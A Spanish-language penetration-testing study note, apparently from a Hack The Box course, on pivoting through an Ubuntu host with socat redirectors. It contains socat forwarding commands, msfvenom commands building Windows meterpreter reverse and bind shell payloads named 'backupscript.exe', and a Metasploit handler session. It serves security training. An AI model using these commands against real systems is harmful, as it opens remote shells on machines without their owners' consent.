**Socat** es una herramienta de red bidireccional que permite crear sockets tipo canal entre dos conexiones de red independientes sin necesidad de utilizar túneles SSH. Actúa como un redireccionador que puede escuchar en un host y puerto determinados y reenviar ese tráfico a otra dirección IP y puerto. Podemos iniciar el listener de Metasploit en nuestro equipo atacante utilizando el mismo comando mencionado en la sección anterior, y ejecutar `socat` en el servidor Ubuntu.

### Redirección Socat con una Reverse Shell

##### Comenzando el listener de Socat

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

**Socat** escuchará en `localhost` en el puerto 8080 y reenviará todo el tráfico al puerto 80 de nuestro equipo atacante (`10.10.14.18`). Una vez que nuestro redireccionador esté configurado, podremos generar un payload que se conecte de vuelta a dicho redireccionador, que estará ejecutándose en el servidor Ubuntu. También iniciaremos un listener en nuestro equipo atacante, ya que, en cuanto `socat` reciba una conexión desde un objetivo, redirigirá todo el tráfico hacia el listener en el equipo atacante, donde recibiremos una shell.

##### Generando el payload Windows

```shell-session
amr251@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

> *Hay que tener en cuenta que debemos transferir el payload al host Windows, podemos usar técnicas vistas previamente*

### Redirección Socat con una Bind Shell

Similar a nuestro redireccionador de reverse shell con **socat**, también podemos crear un redireccionador de **bind shell** con socat. Esto es diferente de las reverse shells que se conectan desde el servidor Windows al servidor Ubuntu y se redirigen a nuestro equipo atacante. En el caso de las bind shells, el servidor Windows iniciará un listener y se enlazará a un puerto específico. Podemos crear un payload de bind shell para Windows y ejecutarlo en el host Windows. Al mismo tiempo, podemos crear un redireccionador socat en el servidor Ubuntu, que escuche conexiones entrantes desde un handler de bind shell en Metasploit y las redirija al payload de bind shell en el objetivo Windows. La figura siguiente debería explicar el pivotaje de una forma mucho más clara.

![[socat_2.png| 800]]

Podemos crear la bind shell usando msfvenom de la siguiente manera:

```shell-session
amr251@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

Podemos iniciar en el servidor Ubuntu un listener de **bind shell** con **socat**, que escuche en el puerto **8080** y reenvíe los paquetes al servidor **Windows** en el puerto **8443**.

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finalmente, empezamos un bind handler en Metasploit. Este bind handler puede ser configurado para conectarse a nuestro listener socat en el puerto 8080 (servidor Ubuntu). Entonces en nuestra máquina de atacante:

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

